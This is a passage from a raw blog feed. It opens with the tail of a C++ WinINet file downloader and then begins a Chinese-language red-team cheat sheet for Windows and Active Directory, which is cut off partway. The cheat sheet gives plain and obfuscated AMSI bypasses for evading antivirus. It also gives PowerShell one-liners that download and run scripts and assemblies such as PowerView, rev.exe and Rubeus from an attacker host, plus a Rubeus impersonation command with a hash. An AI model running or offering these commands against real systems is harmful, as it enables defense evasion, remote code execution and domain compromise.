operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>urlComponents<span class="token punctuation">.</span>dwUrlPathLength <span class="token operator">!=</span>  <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>szURL<span class="token punctuation">,</span> urlComponents<span class="token punctuation">.</span>lpszUrlPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>szURL<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hRequestHead <span class="token operator">=</span> <span class="token function">HttpOpenRequestA</span><span class="token punctuation">(</span>hConnect<span class="token punctuation">,</span> <span class="token string">"HEAD"</span><span class="token punctuation">,</span> szURL<span class="token punctuation">,</span> <span class="token string">"HTTP/1.1"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_FLAG_RELOAD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bRet <span class="token operator">=</span> <span class="token function">_TryHttpSendRequest</span><span class="token punctuation">(</span>hRequestHead<span class="token punctuation">,</span> dwRequestTryTimes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bRet<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>           dwContentLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    dwSizeDW <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>    bRet <span class="token operator">=</span> <span class="token function">HttpQueryInfo</span><span class="token punctuation">(</span>hRequestHead<span class="token punctuation">,</span> HTTP_QUERY_FLAG_NUMBER <span class="token operator">|</span> HTTP_QUERY_CONTENT_LENGTH<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwContentLen<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSizeDW<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bRet<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>dwContentLen <span class="token operator">></span> MAX_DOWNLOAD_BYTESIZE<span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>            <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>         hRequestGet <span class="token operator">=</span> <span class="token function">HttpOpenRequestA</span><span class="token punctuation">(</span>hConnect<span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">,</span> szURL<span class="token punctuation">,</span> <span class="token string">"HTTP/1.1"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_FLAG_RELOAD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bRet <span class="token operator">=</span> <span class="token function">_TryHttpSendRequest</span><span class="token punctuation">(</span>hRequestGet<span class="token punctuation">,</span> dwRequestTryTimes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bRet<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>     <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>         hFileWrite <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>strFileName<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GENERIC_WRITE<span class="token punctuation">,</span> FILE_SHARE_READ<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>INVALID_HANDLE_VALUE <span class="token operator">==</span> hFileWrite<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>         pBuf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>DOWNLOAD_BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pBuf<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>        <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>         dwDownFileTotalBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        dwDownBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>pBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> DOWNLOAD_BUF_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bRet <span class="token operator">=</span> <span class="token function">InternetReadFile</span><span class="token punctuation">(</span>hRequestGet<span class="token punctuation">,</span> pBuf<span class="token punctuation">,</span> DOWNLOAD_BUF_SIZE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwDownBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bRet<span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dwDownBytes <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                dwDownFileTotalBytes <span class="token operator">+</span><span class="token operator">=</span> dwDownBytes<span class="token punctuation">;</span>                bRet <span class="token operator">=</span> <span class="token function">WriteFile</span><span class="token punctuation">(</span>hFileWrite<span class="token punctuation">,</span> pBuf<span class="token punctuation">,</span> dwDownBytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwWriteBytes<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bRet<span class="token punctuation">)</span>                <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token keyword">goto</span> _END_OF_DOWNLOADURL<span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> dwDownBytes<span class="token punctuation">)</span>            <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                bRet <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>             <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>     _END_OF_DOWNLOADURL<span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>INVALID_HANDLE_VALUE <span class="token operator">!=</span> hFileWrite<span class="token punctuation">)</span>        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFileWrite<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pBuf<span class="token punctuation">)</span>        <span class="token keyword">delete</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> pBuf<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hRequestGet<span class="token punctuation">)</span>        <span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hRequestGet<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hRequestHead<span class="token punctuation">)</span>        <span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hRequestHead<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hConnect<span class="token punctuation">)</span>        <span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hConnect<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hInet<span class="token punctuation">)</span>        <span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>hInet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bRet<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> BOOL <span class="token function">_TryHttpSendRequest</span><span class="token punctuation">(</span>LPVOID hRequest<span class="token punctuation">,</span> <span class="token keyword">int</span> nMaxTryTimes<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    BOOL bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>    DWORD dwStatusCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    DWORD dwSizeDW <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>hRequest <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>nMaxTryTimes<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>               bRet <span class="token operator">=</span> <span class="token function">HttpSendRequestA</span><span class="token punctuation">(</span>hRequest<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bRet<span class="token punctuation">)</span>        <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>        <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        dwStatusCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            dwSizeDW <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">;</span>            bRet <span class="token operator">=</span> <span class="token function">HttpQueryInfo</span><span class="token punctuation">(</span>hRequest<span class="token punctuation">,</span> HTTP_QUERY_FLAG_NUMBER <span class="token operator">|</span> HTTP_QUERY_STATUS_CODE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwStatusCode<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSizeDW<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bRet<span class="token punctuation">)</span>            <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>HTTP_STATUS_OK <span class="token operator">==</span> dwStatusCode<span class="token punctuation">)</span>                 <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token keyword">else</span>                <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bRet<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span> <span class="token string">"pls input downloadurl:"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BOOL bR <span class="token operator">=</span> <span class="token function">DownloadUrl</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"temp.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Downloading..."</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bR<span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ok"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">else</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"no"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows和Active Directory备忘单和命令参考</title>
      <link href="/2021/06/08/windows-he-active-directory-bei-wang-dan-he-ming-ling-can-kao.htm"/>
      <url>/2021/06/08/windows-he-active-directory-bei-wang-dan-he-ming-ling-can-kao.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Windows和Active-Directory备忘单和命令参考"><a href="#Windows和Active-Directory备忘单和命令参考" class="headerlink" title="Windows和Active Directory备忘单和命令参考"></a>Windows和Active Directory备忘单和命令参考</h1><h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="PowerShell-AMSI-Bypass"><a href="#PowerShell-AMSI-Bypass" class="headerlink" title="PowerShell AMSI Bypass"></a>PowerShell AMSI Bypass</h3><p>修补AMSI将有助于绕过执行标记为恶意的<code>PowerShell</code>脚本（例如<code>PowerView</code>）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记<code>flag</code>。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。</p><span id="more"></span><p>‘Plain’ AMSI bypass:</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetField<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token string">'NonPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$true</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用于复制粘贴的混淆示例：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">sET-ItEM</span> <span class="token punctuation">(</span> <span class="token string">'V'</span><span class="token operator">+</span><span class="token string">'aR'</span> <span class="token operator">+</span>  <span class="token string">'IA'</span> <span class="token operator">+</span> <span class="token string">'blE:1q2'</span>  <span class="token operator">+</span> <span class="token string">'uZx'</span>  <span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token namespace">[TYpE]</span><span class="token punctuation">(</span>  <span class="token string">"&amp;#123;1&amp;#125;&amp;#123;0&amp;#125;"</span><span class="token operator">-</span>F<span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'rE'</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">;</span>    <span class="token punctuation">(</span>    <span class="token function">GeT-VariaBle</span>  <span class="token punctuation">(</span> <span class="token string">"1Q2U"</span>  <span class="token operator">+</span><span class="token string">"zX"</span>  <span class="token punctuation">)</span>  <span class="token operator">-</span>VaL <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"A`ss`Embly"</span><span class="token punctuation">.</span><span class="token string">"GET`TY`Pe"</span><span class="token punctuation">(</span><span class="token punctuation">(</span>  <span class="token string">"&amp;#123;6&amp;#125;&amp;#123;3&amp;#125;&amp;#123;1&amp;#125;&amp;#123;4&amp;#125;&amp;#123;2&amp;#125;&amp;#123;0&amp;#125;&amp;#123;5&amp;#125;"</span> <span class="token operator">-</span>f<span class="token string">'Util'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'Amsi'</span><span class="token punctuation">,</span><span class="token string">'.Management.'</span><span class="token punctuation">,</span><span class="token string">'utomation.'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'System'</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"g`etf`iElD"</span><span class="token punctuation">(</span>  <span class="token punctuation">(</span> <span class="token string">"&amp;#123;0&amp;#125;&amp;#123;2&amp;#125;&amp;#123;1&amp;#125;"</span> <span class="token operator">-</span>f<span class="token string">'amsi'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'InitFaile'</span>  <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>  <span class="token string">"&amp;#123;2&amp;#125;&amp;#123;4&amp;#125;&amp;#123;0&amp;#125;&amp;#123;1&amp;#125;&amp;#123;3&amp;#125;"</span> <span class="token operator">-</span>f <span class="token string">'Stat'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'NonPubli'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'c,'</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"sE`T`VaLUE"</span><span class="token punctuation">(</span>  $&amp;#123<span class="token punctuation">;</span>n`ULl&amp;#125<span class="token punctuation">;</span><span class="token punctuation">,</span>$&amp;#123<span class="token punctuation">;</span>t`RuE&amp;#125<span class="token punctuation">;</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另一个旁路，PowerShell自动记录未检测到：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token namespace">[Delegate]</span>::CreateDelegate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Func``3[String,<span class="token function"> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token namespace">[String]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Reflection.Bindin'</span><span class="token operator">+</span><span class="token string">'gFlags'</span><span class="token punctuation">)</span></span>).FullName), System.Reflection.FieldInfo]"</span> <span class="token operator">-as</span> <span class="token namespace">[String]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.T'</span><span class="token operator">+</span><span class="token string">'ype'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token namespace">[Object]</span><span class="token punctuation">(</span><span class="token namespace">[Ref]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'GetFie'</span><span class="token operator">+</span><span class="token string">'ld'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token string">'amsiInitFailed'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Non'</span><span class="token operator">+</span><span class="token string">'Public,Static'</span><span class="token punctuation">)</span> <span class="token operator">-as</span> <span class="token namespace">[String]</span><span class="token punctuation">.</span>Assembly<span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'System.Reflection.Bindin'</span><span class="token operator">+</span><span class="token string">'gFlags'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SetValue<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span><span class="token boolean">$True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>更多绕过点击<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">这里</a>。对于混淆，请检查<a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a>，或在<a href="https://amsi.fail/">amsi.fail</a>上获取预先生成的混淆版本。</p></blockquote><h3 id="PowerShell-one-liners"><a href="#PowerShell-one-liners" class="headerlink" title="PowerShell one-liners"></a>PowerShell one-liners</h3><h4 id="反射式加载PowerShell脚本"><a href="#反射式加载PowerShell脚本" class="headerlink" title="反射式加载PowerShell脚本"></a><strong>反射式加载PowerShell脚本</strong></h4><p>代理感知：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/PowerView.obs.ps1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不了解代理：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token variable">$h</span>=<span class="token function">new-object</span> <span class="token operator">-</span>com WinHttp<span class="token punctuation">.</span>WinHttpRequest<span class="token punctuation">.</span>5<span class="token punctuation">.</span>1<span class="token punctuation">;</span><span class="token variable">$h</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'http://10.10.16.7/PowerView.obs.ps1'</span><span class="token punctuation">,</span><span class="token boolean">$false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$h</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">iex</span> <span class="token variable">$h</span><span class="token punctuation">.</span>responseText<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>同样，这可能会被标记flag。有关opsec安全的下载通讯座，请查看<a href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a>。</p></blockquote><h4 id="反射式加载C＃程序集"><a href="#反射式加载C＃程序集" class="headerlink" title="反射式加载C＃程序集"></a><strong>反射式加载C＃程序集</strong></h4><p>在运行该类之前，请确保所引用的类和main方法为Public。请注意，为此可能需要全过程的AMSI旁路，<a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">有关详细信息</a>，<a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">请参见此处</a>。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Download and run assembly without arguments</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/rev.exe'</span><span class="token punctuation">)</span><span class="token variable">$assem</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token namespace">[rev.Program]</span>::Main<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Download and run Rubeus, with arguments</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token string">'http://10.10.16.7/Rubeus.exe'</span><span class="token punctuation">)</span><span class="token variable">$assem</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token namespace">[Rubeus.Program]</span>::Main<span class="token punctuation">(</span><span class="token string">"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt"</span><span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Execute a specific method from an assembly (e.g. a DLL)</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadData<span class="token punctuation">(</span><span class="token 